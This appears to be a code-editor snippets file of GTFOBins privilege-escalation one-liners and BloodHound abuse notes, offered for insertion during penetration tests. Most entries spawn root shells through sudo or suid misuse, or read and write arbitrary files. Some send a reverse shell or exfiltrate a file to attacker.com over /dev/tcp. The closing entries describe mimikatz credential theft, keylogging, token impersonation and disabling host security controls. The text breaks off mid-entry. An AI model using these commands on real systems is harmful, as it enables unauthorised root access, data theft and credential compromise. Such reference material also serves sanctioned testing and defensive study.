    "ncdu sudo (gtfobins)": {
        "prefix": "ncdu sudo",
        "body": [
            "abuse ncdu with sudo",
            "",
            "```sh",
            "sudo ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with sudo"
    },
    "ncdu limited-suid (gtfobins)": {
        "prefix": "ncdu limited-suid",
        "body": [
            "abuse ncdu with limited-suid",
            "",
            "```sh",
            "./ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with limited-suid"
    },
    "composer shell (gtfobins)": {
        "prefix": "composer shell",
        "body": [
            "abuse composer with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with shell"
    },
    "composer limited-suid (gtfobins)": {
        "prefix": "composer limited-suid",
        "body": [
            "abuse composer with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "./composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with limited-suid"
    },
    "composer sudo (gtfobins)": {
        "prefix": "composer sudo",
        "body": [
            "abuse composer with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "sudo composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with sudo"
    },
    "yash shell (gtfobins)": {
        "prefix": "yash shell",
        "body": [
            "abuse yash with shell",
            "",
            "```sh",
            "yash${0}",
            "```"
        ],
        "description": "abuse yash with shell"
    },
    "yash suid (gtfobins)": {
        "prefix": "yash suid",
        "body": [
            "abuse yash with suid",
            "",
            "```sh",
            "./yash${0}",
            "```"
        ],
        "description": "abuse yash with suid"
    },
    "yash sudo (gtfobins)": {
        "prefix": "yash sudo",
        "body": [
            "abuse yash with sudo",
            "",
            "```sh",
            "sudo yash${0}",
            "```"
        ],
        "description": "abuse yash with sudo"
    },
    "check_memory file-read (gtfobins)": {
        "prefix": "check_memory file-read",
        "body": [
            "abuse check_memory with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "check_memory --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_memory with file-read"
    },
    "check_memory sudo (gtfobins)": {
        "prefix": "check_memory sudo",
        "body": [
            "abuse check_memory with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo check_memory --extra-opts=@\\$LFILE${0}",
            "```"
        ],
        "description": "abuse check_memory with sudo"
    },
    "soelim file-read (gtfobins)": {
        "prefix": "soelim file-read",
        "body": [
            "abuse soelim with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with file-read"
    },
    "soelim suid (gtfobins)": {
        "prefix": "soelim suid",
        "body": [
            "abuse soelim with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with suid"
    },
    "soelim sudo (gtfobins)": {
        "prefix": "soelim sudo",
        "body": [
            "abuse soelim with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo soelim \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse soelim with sudo"
    },
    "look file-read (gtfobins)": {
        "prefix": "look file-read",
        "body": [
            "abuse look with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with file-read"
    },
    "look suid (gtfobins)": {
        "prefix": "look suid",
        "body": [
            "abuse look with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with suid"
    },
    "look sudo (gtfobins)": {
        "prefix": "look sudo",
        "body": [
            "abuse look with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo look '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse look with sudo"
    },
    "choom shell (gtfobins)": {
        "prefix": "choom shell",
        "body": [
            "abuse choom with shell",
            "",
            "```sh",
            "choom -n 0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse choom with shell"
    },
    "choom suid (gtfobins)": {
        "prefix": "choom suid",
        "body": [
            "abuse choom with suid",
            "",
            "```sh",
            "./choom -n 0 -- /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse choom with suid"
    },
    "choom sudo (gtfobins)": {
        "prefix": "choom sudo",
        "body": [
            "abuse choom with sudo",
            "",
            "```sh",
            "sudo choom -n 0 /bin/sh${0}",
            "```"
        ],
        "description": "abuse choom with sudo"
    },
    "tmux file-read (gtfobins)": {
        "prefix": "tmux file-read",
        "body": [
            "abuse tmux with file-read, The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tmux -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse tmux with file-read - The file is read and parsed as a `tmux` configuration file, part of the first invalid line is returned in an error message."
    },
    "tmux shell (gtfobins)": {
        "prefix": "tmux shell",
        "body": [
            "abuse tmux with shell, Provided to have enough permissions to access the socket.",
            "",
            "```sh",
            "tmux -S /path/to/socket_name${0}",
            "```"
        ],
        "description": "abuse tmux with shell - Provided to have enough permissions to access the socket."
    },
    "tmux sudo (gtfobins)": {
        "prefix": "tmux sudo",
        "body": [
            "abuse tmux with sudo",
            "",
            "```sh",
            "sudo tmux${0}",
            "```"
        ],
        "description": "abuse tmux with sudo"
    },
    "bash shell (gtfobins)": {
        "prefix": "bash shell",
        "body": [
            "abuse bash with shell",
            "",
            "```sh",
            "bash${0}",
            "```"
        ],
        "description": "abuse bash with shell"
    },
    "bash reverse-shell (gtfobins)": {
        "prefix": "bash reverse-shell",
        "body": [
            "abuse bash with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "bash -c 'exec bash -i &>/dev/tcp/\\$RHOST/\\$RPORT <&1'${0}",
            "```"
        ],
        "description": "abuse bash with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "bash file-upload (gtfobins)": {
        "prefix": "bash file-upload",
        "body": [
            "abuse bash with file-upload, Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "bash -c 'cat \\$LFILE > /dev/tcp/\\$RHOST/\\$RPORT'${0}",
            "```"
        ],
        "description": "abuse bash with file-upload - Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "bash file-download (gtfobins)": {
        "prefix": "bash file-download",
        "body": [
            "abuse bash with file-download, Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "export LFILE=file_to_get",
            "bash -c 'cat < /dev/tcp/\\$RHOST/\\$RPORT > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse bash with file-download - Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "bash file-write (gtfobins)": {
        "prefix": "bash file-write",
        "body": [
            "abuse bash with file-write, This adds timestamps to the output file.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "HISTIGNORE='history *'",
            "history -c",
            "DATA",
            "history -w \\$LFILE${0}",
            "```"
        ],
        "description": "abuse bash with file-write - This adds timestamps to the output file."
    },
    "bash file-read (gtfobins)": {
        "prefix": "bash file-read",
        "body": [
            "abuse bash with file-read, The read file content is surrounded by the current history content.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "HISTTIMEFORMAT=\\$'\\r\\e[K'",
            "history -r \\$LFILE",
            "history${0}",
            "```"
        ],
        "description": "abuse bash with file-read - The read file content is surrounded by the current history content."
    },
    "bash library-load (gtfobins)": {
        "prefix": "bash library-load",
        "body": [
            "abuse bash with library-load",
            "",
            "```sh",
            "bash -c 'enable -f ./lib.so x'${0}",
            "```"
        ],
        "description": "abuse bash with library-load"
    },
    "bash suid (gtfobins)": {
        "prefix": "bash suid",
        "body": [
            "abuse bash with suid",
            "",
            "```sh",
            "./bash -p${0}",
            "```"
        ],
        "description": "abuse bash with suid"
    },
    "bash sudo (gtfobins)": {
        "prefix": "bash sudo",
        "body": [
            "abuse bash with sudo",
            "",
            "```sh",
            "sudo bash${0}",
            "```"
        ],
        "description": "abuse bash with sudo"
    },
    "chown suid (gtfobins)": {
        "prefix": "chown suid",
        "body": [
            "abuse chown with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./chown \\$(id -un):\\$(id -gn) \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chown with suid"
    },
    "chown sudo (gtfobins)": {
        "prefix": "chown sudo",
        "body": [
            "abuse chown with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "sudo chown \\$(id -un):\\$(id -gn) \\$LFILE${0}",
            "```"
        ],
        "description": "abuse chown with sudo"
    },
    "unshare shell (gtfobins)": {
        "prefix": "unshare shell",
        "body": [
            "abuse unshare with shell",
            "",
            "```sh",
            "unshare /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with shell"
    },
    "unshare suid (gtfobins)": {
        "prefix": "unshare suid",
        "body": [
            "abuse unshare with suid",
            "",
            "```sh",
            "./unshare -r /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with suid"
    },
    "unshare sudo (gtfobins)": {
        "prefix": "unshare sudo",
        "body": [
            "abuse unshare with sudo",
            "",
            "```sh",
            "sudo unshare /bin/sh${0}",
            "```"
        ],
        "description": "abuse unshare with sudo"
    },
    "ln sudo (gtfobins)": {
        "prefix": "ln sudo",
        "body": [
            "abuse ln with sudo",
            "",
            "```sh",
            "sudo ln -fs /bin/sh /bin/ln",
            "sudo ln${0}",
            "```"
        ],
        "description": "abuse ln with sudo"
    },
    "torsocks shell (gtfobins)": {
        "prefix": "torsocks shell",
        "body": [
            "abuse torsocks with shell",
            "",
            "```sh",
            "torsocks /bin/sh${0}",
            "```"
        ],
        "description": "abuse torsocks with shell"
    },
    "torsocks sudo (gtfobins)": {
        "prefix": "torsocks sudo",
        "body": [
            "abuse torsocks with sudo",
            "",
            "```sh",
            "sudo torsocks /bin/sh${0}",
            "```"
        ],
        "description": "abuse torsocks with sudo"
    },
    "readelf file-read (gtfobins)": {
        "prefix": "readelf file-read",
        "body": [
            "abuse readelf with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with file-read"
    },
    "readelf suid (gtfobins)": {
        "prefix": "readelf suid",
        "body": [
            "abuse readelf with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with suid"
    },
    "readelf sudo (gtfobins)": {
        "prefix": "readelf sudo",
        "body": [
            "abuse readelf with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo readelf -a @\\$LFILE${0}",
            "```"
        ],
        "description": "abuse readelf with sudo"
    },
    "runscript shell (gtfobins)": {
        "prefix": "runscript shell",
        "body": [
            "abuse runscript with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with shell"
    },
    "runscript limited-suid (gtfobins)": {
        "prefix": "runscript limited-suid",
        "body": [
            "abuse runscript with limited-suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "./runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with limited-suid"
    },
    "runscript sudo (gtfobins)": {
        "prefix": "runscript sudo",
        "body": [
            "abuse runscript with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '! exec /bin/sh' >\\$TF",
            "sudo runscript \\$TF${0}",
            "```"
        ],
        "description": "abuse runscript with sudo"
    },
    "cut file-read (gtfobins)": {
        "prefix": "cut file-read",
        "body": [
            "abuse cut with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with file-read"
    },
    "cut suid (gtfobins)": {
        "prefix": "cut suid",
        "body": [
            "abuse cut with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with suid"
    },
    "cut sudo (gtfobins)": {
        "prefix": "cut sudo",
        "body": [
            "abuse cut with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cut -d \"\" -f1 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cut with sudo"
    },
    "snap sudo (gtfobins)": {
        "prefix": "snap sudo",
        "body": [
            "abuse snap with sudo, \nIt runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nCOMMAND=id\n\ncd $(mktemp -d)\n\nmkdir -p meta/hooks\n\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\n\nchmod +x meta/hooks/install\n\nfpm -n xxxx -s dir -t snap -a all meta\n\n```\n",
            "",
            "```sh",
            "sudo snap install xxxx_1.0_all.snap --dangerous --devmode${0}",
            "```"
        ],
        "description": "abuse snap with sudo - \nIt runs commands using a specially crafted Snap package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nCOMMAND=id\n\ncd $(mktemp -d)\n\nmkdir -p meta/hooks\n\nprintf '#!/bin/sh\\n%s; false' \"$COMMAND\" >meta/hooks/install\n\nchmod +x meta/hooks/install\n\nfpm -n xxxx -s dir -t snap -a all meta\n\n```\n"
    },
    "mv suid (gtfobins)": {
        "prefix": "mv suid",
        "body": [
            "abuse mv with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "./mv \\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse mv with suid"
    },
    "mv sudo (gtfobins)": {
        "prefix": "mv sudo",
        "body": [
            "abuse mv with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "sudo mv \\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse mv with sudo"
    },
    "perlbug shell (gtfobins)": {
        "prefix": "perlbug shell",
        "body": [
            "abuse perlbug with shell",
            "",
            "```sh",
            "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'${0}",
            "```"
        ],
        "description": "abuse perlbug with shell"
    },
    "perlbug sudo (gtfobins)": {
        "prefix": "perlbug sudo",
        "body": [
            "abuse perlbug with sudo",
            "",
            "```sh",
            "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'${0}",
            "```"
        ],
        "description": "abuse perlbug with sudo"
    },
    "vi shell (gtfobins)": {
        "prefix": "vi shell",
        "body": [
            "abuse vi with shell",
            "",
            "```sh",
            "vi",
            ":set shell=/bin/sh",
            ":shell${0}",
            "```"
        ],
        "description": "abuse vi with shell"
    },
    "vi file-write (gtfobins)": {
        "prefix": "vi file-write",
        "body": [
            "abuse vi with file-write",
            "",
            "```sh",
            "vi ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse vi with file-write"
    },
    "vi file-read (gtfobins)": {
        "prefix": "vi file-read",
        "body": [
            "abuse vi with file-read",
            "",
            "```sh",
            "vi ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse vi with file-read"
    },
    "vi sudo (gtfobins)": {
        "prefix": "vi sudo",
        "body": [
            "abuse vi with sudo",
            "",
            "```sh",
            "sudo vi -c ':!/bin/sh' /dev/null${0}",
            "```"
        ],
        "description": "abuse vi with sudo"
    },
    "neofetch shell (gtfobins)": {
        "prefix": "neofetch shell",
        "body": [
            "abuse neofetch with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec /bin/sh' >\\$TF",
            "neofetch --config \\$TF${0}",
            "```"
        ],
        "description": "abuse neofetch with shell"
    },
    "neofetch file-read (gtfobins)": {
        "prefix": "neofetch file-read",
        "body": [
            "abuse neofetch with file-read, The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "neofetch --ascii \\$LFILE${0}",
            "```"
        ],
        "description": "abuse neofetch with file-read - The file content is used as the logo while some other information is displayed on its right, thus it might not be suitable to read arbitray binary files."
    },
    "neofetch sudo (gtfobins)": {
        "prefix": "neofetch sudo",
        "body": [
            "abuse neofetch with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'exec /bin/sh' >\\$TF",
            "sudo neofetch --config \\$TF${0}",
            "```"
        ],
        "description": "abuse neofetch with sudo"
    },
    "valgrind shell (gtfobins)": {
        "prefix": "valgrind shell",
        "body": [
            "abuse valgrind with shell",
            "",
            "```sh",
            "valgrind /bin/sh${0}",
            "```"
        ],
        "description": "abuse valgrind with shell"
    },
    "valgrind sudo (gtfobins)": {
        "prefix": "valgrind sudo",
        "body": [
            "abuse valgrind with sudo",
            "",
            "```sh",
            "sudo valgrind /bin/sh${0}",
            "```"
        ],
        "description": "abuse valgrind with sudo"
    },
    "bzip2 file-read (gtfobins)": {
        "prefix": "bzip2 file-read",
        "body": [
            "abuse bzip2 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with file-read"
    },
    "bzip2 suid (gtfobins)": {
        "prefix": "bzip2 suid",
        "body": [
            "abuse bzip2 with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with suid"
    },
    "bzip2 sudo (gtfobins)": {
        "prefix": "bzip2 sudo",
        "body": [
            "abuse bzip2 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bzip2 -c \\$LFILE | bzip2 -d${0}",
            "```"
        ],
        "description": "abuse bzip2 with sudo"
    },
    "latexmk shell (gtfobins)": {
        "prefix": "latexmk shell",
        "body": [
            "abuse latexmk with shell",
            "",
            "```sh",
            "latexmk -latex='/bin/sh #' /dev/null${0}",
            "```"
        ],
        "description": "abuse latexmk with shell"
    },
    "latexmk file-read (gtfobins)": {
        "prefix": "latexmk file-read",
        "body": [
            "abuse latexmk with file-read, The read file will be part of the output.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{${1:file_to_read}}\\end{document}' >\\$TF",
            "strings tmp.dvi${0}",
            "```"
        ],
        "description": "abuse latexmk with file-read - The read file will be part of the output."
    },
    "latexmk sudo (gtfobins)": {
        "prefix": "latexmk sudo",
        "body": [
            "abuse latexmk with sudo",
            "",
            "```sh",
            "sudo latexmk -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse latexmk with sudo"
    },
    "lwp-download file-download (gtfobins)": {
        "prefix": "lwp-download file-download",
        "body": [
            "abuse lwp-download with file-download",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "lwp-download \\$URL \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-download"
    },
    "lwp-download sudo (gtfobins)": {
        "prefix": "lwp-download sudo",
        "body": [
            "abuse lwp-download with sudo",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "sudo lwp-download \\$URL \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with sudo"
    },
    "lwp-download file-read (gtfobins)": {
        "prefix": "lwp-download file-read",
        "body": [
            "abuse lwp-download with file-read, The file path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp)",
            "lwp-download \"file://\\$LFILE\" \\$TF",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-read - The file path must be absolute."
    },
    "lwp-download file-write (gtfobins)": {
        "prefix": "lwp-download file-write",
        "body": [
            "abuse lwp-download with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA >\\$TF",
            "lwp-download file://\\$TF \\$LFILE${0}",
            "```"
        ],
        "description": "abuse lwp-download with file-write"
    },
    "ssh-keygen library-load (gtfobins)": {
        "prefix": "ssh-keygen library-load",
        "body": [
            "abuse ssh-keygen with library-load",
            "",
            "```sh",
            "ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with library-load"
    },
    "ssh-keygen sudo (gtfobins)": {
        "prefix": "ssh-keygen sudo",
        "body": [
            "abuse ssh-keygen with sudo",
            "",
            "```sh",
            "sudo ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with sudo"
    },
    "ssh-keygen suid (gtfobins)": {
        "prefix": "ssh-keygen suid",
        "body": [
            "abuse ssh-keygen with suid",
            "",
            "```sh",
            "./ssh-keygen -D ./lib.so${0}",
            "```"
        ],
        "description": "abuse ssh-keygen with suid"
    },
    "crontab command (gtfobins)": {
        "prefix": "crontab command",
        "body": [
            "abuse crontab with command, The commands are executed according to the crontab file edited via the `crontab` utility.",
            "",
            "```sh",
            "crontab -e${0}",
            "```"
        ],
        "description": "abuse crontab with command - The commands are executed according to the crontab file edited via the `crontab` utility."
    },
    "crontab sudo (gtfobins)": {
        "prefix": "crontab sudo",
        "body": [
            "abuse crontab with sudo, The commands are executed according to the crontab file edited via the `crontab` utility.",
            "",
            "```sh",
            "sudo crontab -e${0}",
            "```"
        ],
        "description": "abuse crontab with sudo - The commands are executed according to the crontab file edited via the `crontab` utility."
    },
    "basez file-read (gtfobins)": {
        "prefix": "basez file-read",
        "body": [
            "abuse basez with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with file-read"
    },
    "basez suid (gtfobins)": {
        "prefix": "basez suid",
        "body": [
            "abuse basez with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with suid"
    },
    "basez sudo (gtfobins)": {
        "prefix": "basez sudo",
        "body": [
            "abuse basez with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo basez \"\\$LFILE\" | basez --decode${0}",
            "```"
        ],
        "description": "abuse basez with sudo"
    },
    "wireshark command (gtfobins)": {
        "prefix": "wireshark command",
        "body": [
            "abuse wireshark with command, \nThis requires GUI interaction. Start Wireshark, then from the main menu, select \"Tools\" -> \"Lua\" -> \"Evaluate\". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.\n",
            "",
            "```sh",
            "wireshark${0}",
            "```"
        ],
        "description": "abuse wireshark with command - \nThis requires GUI interaction. Start Wireshark, then from the main menu, select \"Tools\" -> \"Lua\" -> \"Evaluate\". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.\n"
    },
    "wireshark sudo (gtfobins)": {
        "prefix": "wireshark sudo",
        "body": [
            "abuse wireshark with sudo, \nThis technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\n\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n\n\n1. select the only received packet;\n\n\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n\n\n3. choose where to save the packet dump.\n",
            "",
            "```sh",
            "PORT=4444",
            "sudo wireshark -c 1 -i lo -k -f \"udp port \\$PORT\" &",
            "echo 'DATA' | nc -u 127.127.127.127 \"\\$PORT\"${0}",
            "```"
        ],
        "description": "abuse wireshark with sudo - \nThis technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\n\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:\n\n\n\n1. select the only received packet;\n\n\n\n2. right-click on \"Data\" from the \"Packet Details\" pane, and select \"Export Packet Bytes...\";\n\n\n\n3. choose where to save the packet dump.\n"
    },
    "GenericAll linux abuse (bloodhound)": {
        "description": "This entity has GenericAll permissions to the  target object.This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.",
        "prefix": "GenericAll",
        "body": [
            "This entity has GenericAll permissions to the  $TARGET.This is also known as full control. This permission allows the trustee to manipulate the target object however they wish.",
            "To Abuse 'GenericAll' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "MemberOf common abuse (bloodhound)": {
        "description": "The  controlled object is a member of the group target object.Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.",
        "prefix": "MemberOf",
        "body": [
            "The  $CONTROLLED is a member of the group $TARGET.Groups in active directory grant their members any privileges the group itself has. If a group has rights to another principal, users/computers in the group, as well as other groups inside the group inherit those permissions.",
            "To Abuse 'MemberOf' commonly: ",
            "No abuse is necessary. This edge simply indicates that a principal belongs to a security group."
        ]
    },
    "AllExtendedRights linux abuse (bloodhound)": {
        "description": "This entity has the AllExtendedRights permission to the  target object.Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions.",
        "prefix": "AllExtendedRights",
        "body": [
            "This entity has the AllExtendedRights permission to the  $TARGET.Extended rights are special rights granted on objects which allow reading of privileged attributes, as well as performing special actions.",
            "To Abuse 'AllExtendedRights' on linux: ",
            "Too much abuse techniques, please refer to the original document for details"
        ]
    },
    "AdminTo common abuse (bloodhound)": {
        "description": "This entity has admin rights to the computer target object.By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution.Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user.Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques.",
        "prefix": "AdminTo",
        "body": [
            "This entity has admin rights to the computer $TARGET.By default, administrators have several ways to perform remote code execution on Windows systems, including via RDP, WMI, WinRM, the Service Control Manager, and remote DCOM execution.Further, administrators have several options for impersonating other users logged onto the system, including plaintext password extraction, token impersonation, and injecting into processes running as another user.Finally, administrators can often disable host-based security controls that would otherwise prevent the aforementioned techniques.",
            "To Abuse 'AdminTo' commonly: ",
            "Lateral movement",
            "There are several ways to pivot to a Windows system. If using Cobalt Strike's beacon, check the help info for the commands \"psexec\", \"psexec_psh\", \"wmi\", and \"winrm\". With Empire, consider the modules for Invoke-PsExec, Invoke-DCOM, and Invoke-SMBExec. With Metasploit, consider the modules \"exploit/windows/smb/psexec\", \"exploit/windows/winrm/winrm_script_exec\", and \"exploit/windows/local/ps_wmi_exec\". With Impacket, consider the example scripts psexec/wmiexec/smbexec/atexec/dcomexec. There are other alternatives like evil-winrm and crackmapexec. Additionally, there are several manual methods for remotely executing code on the machine, including via RDP, with the service control binary and interaction with the remote machine's service control manager, and remotely instantiating DCOM objects. For more information about these lateral movement techniques, see the References tab.",
            "Gathering credentials",
            "The most well-known tool for gathering credentials from a Windows system is mimikatz. mimikatz is built into several agents and toolsets, including Cobalt Strike's beacon, Empire, and Meterpreter. While running in a high integrity process with SeDebugPrivilege, execute one or more of mimikatz's credential gathering techniques (e.g.: sekurlsa::wdigest, sekurlsa::logonpasswords, etc.), then parse or investigate the output to find clear-text credentials for other users logged onto the system.",
            "You may also gather credentials when a user types them or copies them to their clipboard! Several keylogging capabilities exist, several agents and toolsets have them built-in. For instance, you may use meterpreter's \"keyscan_start\" command to start keylogging a user, then \"keyscan_dump\" to return the captured keystrokes. Or, you may use PowerSploit's Invoke-ClipboardMonitor to periodically gather the contents of the user's clipboard.",
            "Token Impersonation",
            "You may run into a situation where a user is logged onto the system, but you can't gather that user's credential. This may be caused by a host-based security product, lsass protection, etc. In those circumstances, you may abuse Windows' token model in several ways. First, you may inject your agent into that user's process, which will give you a process token as that user, which you can then use to authenticate to other systems on the network. Or, you may steal a process token from a remote process and start a thread in your agent's process with that user's token. For more information about token abuses, see the References tab.",
            "Disabling host-based security controls",
            "Several host-based controls may affect your ability to execute certain techniques, such as credential theft, process injection, command line execution, and writing files to disk. Administrators can often disable these host-based controls in various ways, such as stopping or otherwise disabling a service, unloading a driver, or making registry key changes. For more information, see the References tab."
        ]
    },
    "HasSession common abuse (bloodhound)": {
        "description": "The user target object has a session on the computer controlled object.When a user authenticates to a computer, they often leave credentials exposed on the system, which can be retrieved through LSASS injection, token manipulation/theft, or injecting into a user's process.Any user that is an administrator to the system has the capability to retrieve the credential material from memory if it still exists.Note: A session does not guarantee credential material is present, only possible.",
        "prefix": "HasSession",
        "body": [
